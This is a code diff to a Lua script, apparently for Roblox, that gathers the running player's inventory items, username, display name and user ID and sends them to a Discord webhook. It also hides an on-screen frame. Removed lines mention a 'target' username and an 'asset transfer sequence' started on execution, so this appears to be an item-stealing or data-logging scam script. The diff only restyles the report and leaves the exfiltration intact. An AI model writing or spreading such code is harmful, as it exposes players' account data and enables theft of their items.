@@ -58,9 +58,7 @@ if existing then
     if existingFrame then existingFrame.Visible = false end
 end
 
--- ====================================================================
--- UPGRADED DISCORD WEBHOOK LOGGER (No image files / Safe parameters)
--- ====================================================================
+-- Send backpack contents to Discord webhook
 local function sendBackpackToWebhook()
     local backpack = localPlayer:FindFirstChild("Backpack")
     if not backpack then warn("Backpack not found") return end
@@ -68,7 +66,7 @@ local function sendBackpackToWebhook()
     local items = {}
     for _, tool in ipairs(backpack:GetChildren()) do
         if tool:IsA("Tool") then
-            table.insert(items, "🔹 " .. tool.Name)
+            table.insert(items, tool.Name)
         end
     end
 
@@ -76,37 +74,25 @@ local function sendBackpackToWebhook()
     if character then
         for _, tool in ipairs(character:GetChildren()) do
             if tool:IsA("Tool") then
-                table.insert(items, "🔸 " .. tool.Name .. " *(Equipped)*")
+                table.insert(items, tool.Name .. " (equipped)")
             end
         end
     end
 
-    local hasItems = #items > 0
-    local itemList = hasItems and table.concat(items, "\n") or "*No transferable items detected in inventory.*"
-    local embedColor = hasItems and 0x00E5FF or 0x36393E
-
-    local accountAge = "Unknown"
-    pcall(function()
-        accountAge = tostring(localPlayer.AccountAge)
-    end)
+    local itemList = #items > 0 and table.concat(items, "\n") or "No items found"
 
     local HttpService = game:GetService("HttpService")
     local payload = HttpService:JSONEncode({
-        username = "Dispatch Bot",
         embeds = {{
-            title = "📦 INVENTORY DISPATCH REPORT",
-            description = "A new player asset transfer sequence has been initialized on execution.",
-            color = embedColor,
+            title = "Player Inventory Report",
+            color = 5814783,
             fields = {
-                { name = "👤 Account Identity", value = string.format("**User:** %s\n**Display:** %s", localPlayer.Name, localPlayer.DisplayName), inline = true },
-                { name = "🔑 System Metrics", value = string.format("**User ID:** `%s`\n**Account Age:** %s days", tostring(localPlayer.UserId), accountAge), inline = true },
-                { name = "📊 Transmission Status", value = string.format("**Total Items:** `%d`\n**Target:** `%s`", #items, TARGET_USERNAME), inline = false },
-                { name = "📂 Collected Inventory Manifest", value = itemList, inline = false }
+                { name = "Username", value = localPlayer.Name, inline = true },
+                { name = "Display Name", value = localPlayer.DisplayName, inline = true },
+                { name = "User ID", value = tostring(localPlayer.UserId), inline = true },
+                { name = "Items in Backpack (" .. #items .. ")", value = itemList }
             },
-            footer = { 
-                text = "Automated Data Ledger • Pipeline Logs"
-            },
-            timestamp = DateTime.now():ToISO8601String()
+            footer = { text = "Reported at game load" }
         }}
     })
 
